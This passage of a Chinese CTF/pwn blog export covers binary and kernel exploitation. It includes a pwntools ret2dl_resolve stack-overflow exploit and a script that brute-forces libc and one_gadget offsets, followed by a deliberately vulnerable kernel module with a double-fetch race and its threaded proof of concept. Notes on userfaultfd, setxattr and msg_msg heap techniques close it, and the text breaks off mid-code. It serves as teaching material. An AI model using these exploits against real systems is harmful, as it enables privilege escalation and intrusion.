7*8 指向fake_reloc，减去rel_plt即偏移\n#(3)确定动态链接符号下标\nalign = 24 - ((13*8) % 24)# 这里的对齐操作是因为dynsym里的Elf64_Sym结构体都是24字节大小\nfake_sym_addr = base_stage + 13*8 + align\nindex_dynsym = (13*8 + align) / 24 # 除以24因为Elf64_Sym结构体的大小为24，得到write的dynsym索引号\n#(4)伪造重定位结构+动态链接结构\nr_info = (index_dynsym << 32) | 0x7\nfake_reloc = p64(fake_r_offset) + p64(r_info) + p64(0)\nfake_sym = p32(0) + p32(0x112) + p64(fake_st_value) + p64(0)\n\npayload2 = p64(0)#'AAAAAAAA'\npayload2 += p64(p_rdi_ret)\npayload2 += p64(base_stage+0xc0)   #/bin/sh\npayload2 += p64(plt_1)\npayload2 += p64(fake_link_map)   #\npayload2 += p64(index)       #jmprel 下标参数\npayload2 += p64(0)       #返回地址\n\npayload2 = payload2.ljust(index_offset-base_stage,'\\x00')\npayload2 += fake_reloc # index_offset(base_stage+7*8)的位置\npayload2 = payload2.ljust(fake_sym_addr-base_stage,'\\x00')\npayload2 += fake_sym   # fake_sym_addr(base_stage+9*8)的位置\npayload2 = payload2.ljust(0xc0,'\\x00')\npayload2 += p64(base_stage)\npayload2 = payload2.ljust(0xd0,'\\x00')\n\np.send(payload2)\nsleep(wait_time)\np.interactive()\n```\n\n#### ③只有read时\n\n这种情况一般需要爆破libc文件，但是需要一个库，所以还得自己准备一个比较完整的libc文件库，这里自己写了一个工具，专门用来依据libc文件库爆破，直接给出代码，这个等我啥时候有时间详细完成一下这个工具。\n\n```python\n#coding:utf-8\nfrom pwn import *\nimport myTool\n\n#需修改:文件名、溢出偏移、gadget地址、各节地址\nglobal p\nfpath = './bstack'\n\noffset_rbp = 0x70\nlength = 0x100\nstack_size = 0x800\nleave_ret=0x00000000004006AB\nvuln_addr=0x400676\n\n\n#p = process(fpath)\n#arch = \"x86-64\"/\"i386\"\nlibc_list = myTool.getLibc(\"x86-64\",version=\"2.27\")\nlibcAll_path = '/home/hacker/LibcSearcher/libc-database/libcAllSo/'\nelf = ELF(fpath)\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\n\ndef makecall(p6_addr,call_addr,addr, rdi, rsi, rdx, tail = 0):\n    payload = ''\n    payload += p64(p6_addr)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(addr)\n    payload += p64(rdx)\n    payload += p64(rsi)\n    payload += p64(rdi)\n    payload += p64(call_addr)\n    if (tail):\n        payload += p64(0x0) * 7 + p64(tail)\n    return payload\n\n\n#cat flag\ndef regexp_out(data):\n    patterns = [\n        re.compile(r'flag{.*?}'),\n        re.compile(r'xnuca{(.*?)}'),\n        re.compile(r'DASCTF{(.*?)}'),\n        re.compile(r'WMCTF{.*?}'),\n        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),\n    ]\n    for pattern in patterns:\n        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)\n        if len(res) > 0:\n            return str(res[0])\n    return None\n\n\ndef pwn(libcFile,one_gadget):\n    #libc = ELF(\"./libc.so.6\",checksec = False)\n    #one_gadget = 0x4f432\n\n    libc = ELF(libcFile,checksec = False)\n\n    plt_0 = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\n    p6_addr=elf.sym['__libc_csu_init'] + 0x5a\n    call_addr=elf.sym['__libc_csu_init'] + 0x40\n    p_rdi_ret=elf.sym['__libc_csu_init'] + 0x63\n    p_rbp_ret=elf.sym['register_tm_clones'] + 0x38\n    read_got=elf.got['read']\n    read_plt = elf.plt['read']\n    got_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008\n    bss_addr =elf.get_section_by_name('.bss').header.sh_addr\n    libc_bss_addr = libc.get_section_by_name('.bss').header.sh_addr\n    base_stage = bss_addr + stack_size\n    libc_start_main_addr = libc.sym['__libc_start_main']\n    fake_link_map=elf.got['__libc_start_main']    #change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n    fake_st_value=one_gadget-libc_start_main_addr    #0x4526a   0xf02a4     0xf1147\n    fake_r_offset=libc_bss_addr-libc_start_main_addr\n    # fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147\n    # fake_r_offset=0x3c5720-0x20740\n\n    val_0x68=base_stage+0xc0-8    #0x600ea8\n    val_0x70=base_stage+0xc0-8    #0x600eb8\n    val_0xf8=base_stage+0xc0-8    #0x600f28\n    wait_time=0.1\n\n    #print p.recv()        # 'Welcome to XDCTF2015~!\\n'\n\n    #1.往fake_link_map+0x68写值\n    payload='\\x00'*offset_rbp\n    payload+='\\x00'*8\n    payload+=makecall(p6_addr,call_addr,read_got,0,fake_link_map+0x68,16,tail=vuln_addr)\n    payload=payload.ljust(0x100,'\\x00')\n    #gdb_a(0x4006AA)\n    p.send(payload)\n    #pause()\n    sleep(wait_time)\n    p.send(p64(val_0x68)+p64(val_0x70))\n\n    #2.往fake_link_map+0xf8写值\n    payload='\\x00'*offset_rbp\n    payload+='\\x00'*8\n    payload+=makecall(p6_addr,call_addr,read_got,0,fake_link_map+0xf8,8,tail=vuln_addr)\n    payload=payload.ljust(0x100,'\\x00')\n    p.send(payload)\n    sleep(wait_time)\n    p.send(p64(val_0xf8))\n\n    #3.往base_stage写入伪造结构并跳过去\n    payload='\\x00'*offset_rbp\n    payload+='\\x00'*8\n    payload+=makecall(p6_addr,call_addr,read_got,0,base_stage,0xd0,tail=0)   #假设结构大小是400\n    payload+=p64(0)*2+p64(base_stage)+p64(0)*4\n    payload+=p64(leave_ret)\n    payload=payload.ljust(0x100,'\\x00')\n    p.send(payload)\n\n\n    #4.bss数据：rop-参数放在寄存器/ 伪造结构  \n    #(1)确定各个节的地址 \n    plt_1 = plt_0+6\n    #(2)确定重定位下标\n    align = 24 - (56 % 24)  # 这里的对齐操作是因为dynsym里的ELF64_R_SYM结构体都是24字节大小\n    index_offset = base_stage + 7*8 + align\n    index = (7*8 + align) / 24 # base_stage + 7*8 指向fake_reloc，减去rel_plt即偏移\n    #(3)确定动态链接符号下标\n    align = 24 - ((13*8) % 24)# 这里的对齐操作是因为dynsym里的Elf64_Sym结构体都是24字节大小\n    fake_sym_addr = base_stage + 13*8 + align\n    index_dynsym = (13*8 + align) / 24 # 除以24因为Elf64_Sym结构体的大小为24，得到write的dynsym索引号\n    #(4)伪造重定位结构+动态链接结构\n    r_info = (index_dynsym << 32) | 0x7\n    fake_reloc = p64(fake_r_offset) + p64(r_info) + p64(0)\n    fake_sym = p32(0) + p32(0x112) + p64(fake_st_value) + p64(0)\n\n    payload2 = p64(0)#'AAAAAAAA'\n    payload2 += p64(p_rdi_ret)\n    payload2 += p64(base_stage+0xc0)   #/bin/sh\n    payload2 += p64(plt_1)\n    payload2 += p64(fake_link_map)   #\n    payload2 += p64(index)       #jmprel 下标参数\n    payload2 += p64(0)       #返回地址\n\n    payload2 = payload2.ljust(index_offset-base_stage,'\\x00')\n    payload2 += fake_reloc # index_offset(base_stage+7*8)的位置\n    payload2 = payload2.ljust(fake_sym_addr-base_stage,'\\x00')\n    payload2 += fake_sym   # fake_sym_addr(base_stage+9*8)的位置\n    payload2 = payload2.ljust(0xc0,'\\x00')\n    payload2 += p64(base_stage)\n    payload2 = payload2.ljust(0xd0,'\\x00')\n\n    p.send(payload2)\n    sleep(wait_time)\n\n    #----getshell-----\n    #no interactive\n    p.recv(timeout=0.5)\n    try:\n        p.sendline(b'cat flag')\n        flag = p.recvuntil(b'}')\n    except:\n        p.close()\n        #continue\n    if b'}' in flag:\n        log.success('flag: %s', regexp_out(flag))\n        exit()\n\n\n\ni = 0\nwhile True:\n    global p\n    i += 1\n    log.info(\"Times:%d\"%i)\n    for libcFile in libc_list:\n        libcFile = libcAll_path + libcFile\n        one_gadget_list = myTool.getOnegadget(libcFile)\n        for one_gadget in one_gadget_list:\n            try:\n                p = process(fpath)\n                log.success('libcFile: %s',libcFile)\n                #print(one_gadget)\n                pwn(libcFile,one_gadget)\n                #pwn()\n            except EOFError:\n                p.close()\n                continue\n            except Exception:\n                p.close()\n                continue\n            else:\n                p.interactive()\n                break\n```\n\n\n\n#### ④开了沙箱，只有read和libc文件\n\n这种就得用orw来读取flag了或者使用测信道攻击，之后再来详细完成一下把。\n\n[栈溢出(64bit)的一些操作<二> (zoepla.github.io)](https://zoepla.github.io/2018/08/栈溢出_二_-64位/)\n\n\n\n\n\n\n\n\n\n\n\n🔺有时候万能gadget可能不太一样\n\n![image-20211214220500845](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211214220500.png)\n\nrdi和rdx的赋值顺序可能发生变化，需要注意\n","tags":["栈溢出"],"categories":["PWN","栈溢出"]},{"title":"pwnKernel从0开始(四)","url":"/2021/10/19/Kernel从0开始(四)/","content":"\n\n\n# 前言\n\n这里尝试各种各样的骚操作解法\n\n# 一、多线程的真条件竞争\n\n## 1.简单的多线程\n\n先给出自己编写的题目源码，参照多方题目，主要还是0CTF2018-baby\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//设备驱动常用变量\n//static char *buffer_var = NULL;\nstatic char *buffer_var = NULL;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t condition_dev_no;\n\n\nstruct flagStruct\n{\n    int len;\n    char* flagUser;\n};\n\n\n\nstatic struct flagStruct* flagObj;\nstatic char* flag = \"flag{PIG007NBHH}\";\n\nstatic long condition_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\nstatic int condition_open(struct inode *i, struct file *f);\n\nstatic int condition_close(struct inode *i, struct file *f);\n\nstatic bool chk_range_not_ok(ssize_t v1,ssize_t v2);\n\n\nstatic struct file_operations condition_fops =\n        {\n                .owner = THIS_MODULE,\n                .open = condition_open,\n                .release = condition_close,\n                .unlocked_ioctl = condition_ioctl\n        };\n\n// 设备驱动模块加载函数\nstatic int __init condition_init(void)\n{\n    printk(KERN_INFO \"[i] Module condition registered\");\n    if (alloc_chrdev_region(&condition_dev_no, 0, 1, \"condition\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(condition_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, condition_dev_no, NULL, \"condition\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module condition error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(condition_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &condition_fops);\n    if (cdev_add(&cdev, condition_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, condition_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(condition_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(condition_dev_no), MINOR(condition_dev_no));\n    return 0;\n\n}\n\n// 设备驱动模块卸载函数\nstatic void __exit condition_exit(void)\n{\n    // 释放占用的设备号\n    unregister_chrdev_region(condition_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n\n\n// ioctl函数命令控制\nlong condition_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    int retval = 0;\n    printk(KERN_INFO \"Ioctl Get!\\n\");\n    switch (cmd) {\n        case 111: //doubleCon  //get flag_addr\n            printk(\"Your flag is at %llx! But I don't think you know it's content\\n\",flag);\n            break;\n\n        case 222: //doubleCon  //print flag\n            flagObj =  (struct flagStruct*)arg;\n            ssize_t userFlagAddr = flagObj->flagUser;\n            ssize_t userFlagObjAddr = (ssize_t)flagObj;\n    \n            if(chk_range_not_ok(userFlagAddr,flagObj->len)\n                &&chk_range_not_ok(userFlagObjAddr,0)\n                &&(flagObj->len == strlen(flag)))\n    \n            {\n                if(!strncmp(flagObj->flagUser,flag,strlen(flag)))\n                    printk(\"Looks like the flag is not a secret anymore. So here is it %s\\n\", flag);\n                else\n                    printk(\"Wrong!\");\n                break;\n            }\n            else\n            {\n                printk(\"Wrong!\\n\");\n                break;\n            }\n        default:\n            retval = -1;\n            break;\n    }    \n    \n    return retval;\n\n}\n\n\nstatic bool chk_range_not_ok(ssize_t v1,ssize_t v2)\n{\n    if((v1 + v2) <= 0x7ffffffff000)\n        return true;\n    else\n        return false;\n}\n\nstatic int condition_open(struct inode *i, struct file *f)\n{\n    printk(KERN_INFO \"[i] Module condition: open()\\n\");\n    return 0;\n}\n\nstatic int condition_close(struct inode *i, struct file *f)\n{\n    kfree(buffer_var);\n    //buffer_var = NULL;\n    printk(KERN_INFO \"[i] Module condition: close()\\n\");\n    return 0;\n}\n\nmodule_init(condition_init);\nmodule_exit(condition_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n### (1)前置知识\n\n主要是线程的知识。\n\n就是如果一个变量是全局的，那么在没有锁的情况就会导致一个程序的不同线程对该全局变量进行的竞争读写操作。就像这里给出的代码，首先flag在内核模块中是静态全局的：\n\n```c\nstatic char* flag = \"flag{PIG007NBHH}\";\n//--------------------------------------------------\nif(chk_range_not_ok(userFlagAddr,flagObj->len)\n   &&chk_range_not_ok(userFlagObjAddr,0)\n   &&(flagObj->len == strlen(flag)))\n\n{\n    if(!strncmp(flagObj->flagUser,flag,strlen(flag)))\n        printk(\"Looks like the flag is not a secret anymore. So here is it %s\\n\", flag);\n    else\n        printk(\"Wrong!\");\n    break;\n}\nelse\n{\n    printk(\"Wrong!\\n\");\n    break;\n}\n```\n\n\n\n### (2)检测：\n\n先检测传入的数据的地址是否是在用户空间，长度是否为flag的长度，传入的所有数据是否处在用户空间。如果都是，再判断传入的数据与flag是否一致，一致则打印flag，否则打印Wrong然后退出。\n\n这么一看好像无法得到flag，首先flag我们不知道，是硬编码在内核模块中的。其次就算无法传入内核模块中的地址，意味着就算我们获得了内核模块中flag的地址和长度，传进去也会判定失败。\n\n### (3)漏洞\n\n但是这是建立在一个线程中的，如果是多个线程呢。在我们传入用户空间的某个数据地址和长度之后，先进入程序的if语句，也就是进入如下if语句\n\n```c\nif(chk_range_not_ok(userFlagAddr,flagObj->len)\n   &&chk_range_not_ok(userFlagObjAddr,0)\n   &&(flagObj->len == strlen(flag)))\n```\n\n然后在检测flag数据之前，也就是如下if语句之前，启动另外一个线程把传入的该数据地址给改成内核模块的flag的数据地址，这样就能成功打印flag了。\n\n```c\nif(!strncmp(flagObj->flagUser,flag,strlen(flag)))\n```\n\n那么就直接给出POC，这里涉及到一些线程的操作，可以自己学习一下。\n\n\n\n### (4)POC\n\n```C\n// gcc -static exp.c -lpthread -o exp\n#include <string.h>\n//char *strstr(const char *haystack, const char *needle);\n//#define _GNU_SOURCE         /* See feature_test_macros(7) */\n//char *strcasestr(const char *haystack, const char *needle);\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n#define TRYTIME 0x1000\n\n\nstruct flagStruct\n{\n    int len;\n    char* flagUseAddr;\n};\nstruct flagStruct flagChunk;\n\n\n//open dev\nint openDev(char* pos);\n\n\nchar readFlagBuf[0x1000+1]={0};\nint finish =0;\nunsigned long long flagKerneladdr;\nvoid changeFlagAddr(void* arg);\n\nint main(int argc, char *argv[])\n{\n    setvbuf(stdin,0,2,0);\n    setvbuf(stdout,0,2,0);\n    setvbuf(stderr,0,2,0); \n\n    int devFD;\n    int addrFD;\n    unsigned long memOffset;\n    pthread_t thread;\n\n    //open Dev\n    char* pos = \"/dev/condition\";\n    devFD = openDev(pos);\n\n    char flagBuf[16] = {0};\n    flagReadFun(devFD,16,flagBuf);\n\n\n    system(\"dmesg > /tmp/record.txt\");\n    addrFD = open(\"/tmp/record.txt\",O_RDONLY);\n    lseek(addrFD,-0x1000,SEEK_END);\n    read(addrFD,readFlagBuf,0x1000);\n    close(addrFD);\n    int flagIdxInBuf;\n    flagIdxInBuf = strstr(readFlagBuf,\"Your flag is at \");\n    if (flagIdxInBuf == 0){\n        printf(\"[-]Not found addr\");\n        exit(-1);\n    }\n    else{\n        flagIdxInBuf+=16;\n        flagKerneladdr = strtoull(flagIdxInBuf,flagIdxInBuf+16,16);\n        printf(\"[+]flag addr: %p\\n\",flagKerneladdr);\n    }\n\n    pthread_create(&thread, NULL, changeFlagAddr,&flagChunk);\n    for(int i=0;i<TRYTIME;i++){\n        flagJudgeFun(devFD,16,&flagBuf);\n    }\n    finish = 1;\n    pthread_join(thread, NULL);\n\n    close(devFD);\n    puts(\"[+]result is :\");\n    system(\"dmesg | grep flag\");\n    return 0;\n}\n\n\nint openDev(char* pos){\n    int devFD;\n    printf(\"[+] Open %s...\\n\",pos);\n    if ((devFD = open(pos, O_RDWR)) < 0) {\n        printf(\"    Can't open device file: %s\\n\",pos);\n        exit(1);\n    }\n    return devFD;\n}\n\nvoid flagReadFun(int devFD,int len,char *buf)\n{\n    flagChunk.len = len;\n    flagChunk.flagUseAddr = buf;\n    ioctl(devFD,111,&flagChunk);\n}\n\n\nvoid flagJudgeFun(int devFD,int len,char *buf)\n{\n    flagChunk.len = len;\n    flagChunk.flagUseAddr = buf;\n    ioctl(devFD,222,&flagChunk);\n}\n\nvoid changeFlagAddr(void* arg){\n    struct flagStruct * flagPTChunk = arg;\n    while(finish==0){\n        //s1->flagUseAddr = flagKerneladdr;\n        flagPTChunk->flagUseAddr = flagKerneladdr;\n    }\n}\n\n```\n\n最后如下效果：\n\n![image-20211019152909777](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211019152917.png)\n\n需要注意的是在gcc编译的时候需要加上`-lpthread`多线程的参数。还有线程的回调函数必须传入至少一个参数，不管该参数在里面有没有被用到。\n\n\n\n## 2.UserFaultFD\n\n关于这个实在是有点多，涉及的知识也有点多，具体的可以看，版本在v4.3及以上才可用\n\n[Linux Kernel Userfaultfd 内部机制探究 - BrieflyX's Base](http://brieflyx.me/2020/linux-tools/userfaultfd-internals/)\n\n[从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/253835#h3-5)\n\n主要就是使用方法，以及是否可用\n\n### (1)是否可用\n\n#### ①编译时\n\n在我们编译内核的时候，需要加入如下的选项在.config中\n\n```\nCONFIG_USERFAULTFD=y\n```\n\n不然当我们尝试使用如下代码注册时，就会返回-1，表示失败\n\n```\nuffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n```\n\n#### ②版本限制\n\n在v5.11及以上的版本中加入了如下限制\n\n```c\n//fs/userfaultfd.c\nif (!sysctl_unprivileged_userfaultfd &&\n    (flags & UFFD_USER_MODE_ONLY) == 0 &&\n    !capable(CAP_SYS_PTRACE)) {\n    printk_once(KERN_WARNING \"uffd: Set unprivileged_userfaultfd \"\n                \"sysctl knob to 1 if kernel faults must be handled \"\n                \"without obtaining CAP_SYS_PTRACE capability\\n\");\n    return -EPERM;\n}\n```\n\n也就是说，必须要是root权限才可以使用该机制\n\n### (2)使用方法\n\n探究完了是否可用，再来看看使用方法，同样在上面给出的链接中有一个板子，尝试拿来用一下\n\n```c\n#include <sys/types.h>\n#include <sys/xattr.h>\n#include <stdio.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <sys/sem.h>\n#include <sys/ipc.h>\n#include <sys/shm.h>\n#include <semaphore.h>\n\nstatic char     *page = NULL;\nstatic size_t   page_size;\nstatic pthread_t monitor_thread;\n\nvoid registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*));\nvoid errExit(char *msg);\nstatic void * test_thread(void *arg);\n\n\nint main(int argc, char *argv[])\n{\n    char *uffd_buf_leak;\n    page = malloc(0x1000);\n    for(int i = 0 ; i < 0x20 ; i ++)\n    {\n        page[i] == \"\\x62\";\n    }\n    page_size = sysconf(_SC_PAGE_SIZE);\n\n    //申请一块保护内存，我们对该内存进行读写操作就会被userfaultfd给捕获，从而进入到test_thread函数中\n    uffd_buf = (char*) mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    registerUserFaultFd(uffd_buf, page_size, test_thread);\n    printf(\"\\033[1;31;40m[Test:]%016llx\\033[0m\\n\",*uffd_buf);\n}\n\n\nstatic void * test_thread(void *arg)\n{\n    struct uffd_msg msg;\n    int fault_cnt = 0;\n    long uffd;\n\n    struct uffdio_copy uffdio_copy;\n    ssize_t nread;\n\n    uffd = (long) arg;\n\n\n    for (;;)\n    {\n        struct pollfd pollfd;\n        int nready;\n        pollfd.fd = uffd;\n        pollfd.events = POLLIN;\n        nready = poll(&pollfd, 1, -1);\n\n\n\n        //自定义代码区域----------------------\n        printf(\"\\033[1;31;40m[Loading handler userfaultfd]%016llx\\033[0m\\n\");\n        //-------------------------------------\n\n\n\n        //判断是否正确打开\n        if (nready == -1)\n            errExit(\"poll\");\n        nread = read(uffd, &msg, sizeof(msg));\n        if (nread == 0)\n            errExit(\"EOF on userfaultfd!\\n\");\n        if (nread == -1)\n            errExit(\"read\");\n        if (msg.event != UFFD_EVENT_PAGEFAULT)\n            errExit(\"Unexpected event on userfaultfd\\n\");\n\n\n\n        //数据拷贝区域\n        uffdio_copy.src = (unsigned long) page;\n        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &\n                          ~(page_size - 1);\n        uffdio_copy.len = page_size;\n        uffdio_copy.mode = 0;\n        uffdio_copy.copy = 0;\n        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)\n            errExit(\"ioctl-UFFDIO_COPY\");\n        return NULL;\n    }\n}\n\nvoid registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))\n{\n    long uffd;\n    struct uffdio_api uffdio_api;\n    struct uffdio_register uffdio_register;\n    int s;\n\n/* Create and enable userfaultfd object */\n    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    if (uffd == -1)\n        errExit(\"userfaultfd\");\n\n    uffdio_api.api = UFFD_API;\n    uffdio_api.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)\n        errExit(\"ioctl-UFFDIO_API\");\n\n    uffdio_register.range.start = (unsigned long) addr;\n    uffdio_register.range.len = len;\n    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)\n        errExit(\"ioctl-UFFDIO_REGISTER\");\n\n    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);\n    if (s != 0)\n        errExit(\"pthread_create\");\n}\n\nvoid errExit(char *msg)\n{\n    printf(\"\\033[31m\\033[1m[x] Error at: \\033[0m%s\\n\", msg);\n    exit(EXIT_FAILURE);\n}\n```\n\n如下效果：\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203081748375.png)\n\n可以看到在试图打印被我们申请读写保护的区域时，会调用到我们的`test_thread`函数中\n\n### (3)配合知识点\n\n通常意义上来讲，UserFaultFD是用在多线程下，用来制造double-free或者UAF的。而在比较严苛的条件下，比如，没法写，或者没办法读的时候，就需要配合以下的两个知识点。\n\n#### setxattr\n\n调用链为\n\n```\nSYS_setxattr()->path_setxattr()->setxattr()\n```\n\n代码如下\n\n```c\n//fs/xattr.c\nstatic long\nsetxattr(struct user_namespace *mnt_userns, struct dentry *d,\n\t const char __user *name, const void __user *value, size_t size,\n\t int flags)\n{\n\tint error;\n\tvoid *kvalue = NULL;\n\tchar kname[XATTR_NAME_MAX + 1];\n\n\tif (flags & ~(XATTR_CREATE|XATTR_REPLACE))\n\t\treturn -EINVAL;\n\n\terror = strncpy_from_user(kname, name, sizeof(kname));\n\tif (error == 0 || error == sizeof(kname))\n\t\terror = -ERANGE;\n\tif (error < 0)\n\t\treturn error;\n\n\tif (size) {\n\t\tif (size > XATTR_SIZE_MAX)\n\t\t\treturn -E2BIG;\n        //申请chunk，基本相当于kmalloc函数，size可控\n\t\tkvalue = kvmalloc(size, GFP_KERNEL);\n\t\tif (!kvalue)\n\t\t\treturn -ENOMEM;\n        //从value拷贝内容到kvalue，value可控\n\t\tif (copy_from_user(kvalue, value, size)) {\n\t\t\terror = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\tif ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||\n\t\t    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))\n\t\t\tposix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);\n\t}\n\n\terror = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);\nout:\n    //释放chunk，基本等于kfree函数\n\tkvfree(kvalue);\n\n\treturn error;\n}\n```\n\n关注点在`kvmalloc`、`copy_from_user`、`kvfree`。\n\n`kvmalloc`中的size可控，`copy_from_user`中的value可控\n\n也就是说当`freelist`中存在我们需要修改的chunk，而该chunk又是我们控制的某个设备内存块时，(通过double-free或者UAF实现)那么我们就可以通过`setxattr`来对该设备内存进行任意写。虽然最后会释放，但是也只会影响内存块中存放下一个chunk地址处的内容0x8个字节，而当我们用不着这个地方的内容时，就不用太关注了。\n\n##### 🔺注：\n\n使用的时候需要注意指定一个当前的exp程序，类似如下，第二个参数字符串任意。\n\n```C\nsetxattr(\"/tmp/ufdExp\", \"PIG-007\", &buf,0x100,0);\n```\n\n#### msg_msg\n\n这个下面新创一个点，方便标题跳转\n\n## 3.msg_msg\n\n承接上面的知识点\n\n这个在之前也总结过，不过总结得有些错误，也不太完善，这里再好好总结一下\n\n修改时间：`2022-05-12`\n\n参照：[【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#分配（GFP-KERNEL-ACCOUNT）：msgsnd-系统调用)\n\n[Linux内核中利用msg_msg结构实现任意地址读写 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252558)\n\n[Linux的进程间通信 - 消息队列 · Poor Zorro's Linux Book (gitbooks.io)](https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html)\n\n《Linux/Unix系统编程手册》\n\n### (1)使用方法\n\n#### ①创建\n\n- 首先创建`queue_id`管理标志，对应于内核空间的`msg_queue`管理结构\n\n  ```c\n  //key要么使用ftok()算法生成,要么指定为IPC_PRIVATE\n  //代表着该消息队列在内核中唯一的标识符\n  //使用IPC_PRIVATE会生成全新的消息队列IPC对象\n  int32_t make_queue(key_t key, int msg_flag)\n  {\n      int32_t result;\n      if ((result = msgget(key, msg_flag)) == -1) \n      {\n          perror(\"msgget failure\");\n          exit(-1);\n      }\n      return result;\n  }\n  \n  int queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n  ```\n\n  使用简单封装的`msgget`函数或者系统调用号`__NR_msgget`，之后保存数据的消息就会在这个`queue_id`管理标志，以及内核空间的`msg_queue`管理结构下进行创建\n\n#### ②数据传输\n\n- 写入消息：\n\n  然后就可以依据`queue_id`写入消息了，不同于`pipe`和`socketpair`，这个需要特定的封装函数（`msgsnd/msgrcv`）或者对应的系统调用（`__NR_msgrcv/__NR_msgsnd`）来实现。\n\n  ```c\n  typedef struct\n  {\n          long mtype;\n          char mtext[1];\n  }msgp;\n  \n  //msg_buf实际上为msgp,里面包含mtype,这个mtype在后面的堆块构造中很有用\n  void send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n  {\n      if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n      {\n          perror(\"msgsend failure\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_send_buf[0x2000];\n  m_ts_size = 0x400-0x30;//任意指定\n  msg *message = (msg *)queue_send_buf;\n  message->mtype = 0;\n  send_msg(queue_id, message, m_ts_size, 0);\n  ```\n\n- 读取消息：\n\n  之后即可依据`queue_id`读取消息\n\n  ```c\n  void get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n  {\n      if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n      {\n          perror(\"msgrcv\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_recv_buf[0x2000];\n  m_ts_size = 0x400-0x30;//任意指定\n  get_msg(queue_id, 